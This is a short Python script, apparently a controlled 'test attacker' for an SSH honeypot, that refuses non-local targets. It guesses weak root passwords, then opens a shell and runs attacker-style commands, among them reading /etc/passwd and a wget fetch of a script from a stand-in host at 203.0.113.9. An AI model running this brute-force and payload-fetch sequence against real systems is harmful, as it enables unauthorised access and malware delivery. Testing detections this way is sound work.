"""Controlled SSH test attacker (local targets only). Usage: python scripts/ssh_attacker.py [host] [port]"""
import asyncio, sys, asyncssh
host, port = (sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"), int(sys.argv[2]) if len(sys.argv) > 2 else 2222
if host not in ("127.0.0.1", "localhost"): sys.exit("refusing non-local target")
async def main():
    for pw in ("123456", "admin"):
        try: await asyncssh.connect(host, port, username="root", password=pw, known_hosts=None, client_keys=None, agent_path=None)
        except asyncssh.PermissionDenied: print("login failed:", pw)
    async with asyncssh.connect(host, port, username="root", password="toor", known_hosts=None, client_keys=None, agent_path=None) as c:
        p = await c.create_process()
        p.stdin.write("whoami\nuname -a\ncat /etc/passwd\nwget http://203.0.113.9/x.sh\nchmod +x x.sh\nexit\n")
        print(await asyncio.wait_for(p.stdout.read(), 15))
asyncio.run(main())
